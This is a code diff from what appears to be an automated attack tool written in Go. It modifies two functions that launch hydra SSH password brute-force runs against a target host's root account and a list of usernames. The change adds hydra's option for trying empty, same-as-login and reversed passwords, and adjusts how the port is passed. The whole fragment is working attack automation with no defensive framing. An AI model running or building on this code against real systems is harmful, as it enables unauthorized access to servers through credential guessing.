@@ -35,8 +35,8 @@ func (t *targetT) sshBruteRoot(scan string, port int, wg *sync.WaitGroup) {
 	c.name = "ssh_root_" + scan
 	c.bin = "hydra"
 
-	argsS := fmt.Sprintf("-l root -P %s -I -u ssh://%s:%d -t 4",
-		"./data/ssh_root_pass_"+scan, t.host, port)
+	argsS := fmt.Sprintf("-e nsr -l root -P %s -I -u -s %d -t 4 ssh://%s",
+		"./data/ssh_root_pass_"+scan, port, t.host)
 
 	c.args = str.Split(argsS, " ")
 
@@ -49,8 +49,12 @@ func (t *targetT) sshBruteUser(scan string, port int, wg *sync.WaitGroup) {
 	c.name = "ssh_user_" + scan
 	c.bin = "hydra"
 
-	argsS := fmt.Sprintf("-L %s -P %s -I -u ssh://%s:%d -t 2",
-		"./data/ssh_user", "./data/ssh_user_pass_"+scan, t.host, port)
+	var argsS string
+	if scan == "1" {
+		argsS = "-e nsr "
+	}
+	argsS += fmt.Sprintf("-L %s -P %s -I -u -s %d -t 2 ssh://%s",
+		"./data/ssh_user", "./data/ssh_user_pass_"+scan, port, t.host)
 
 	c.args = str.Split(argsS, " ")
 
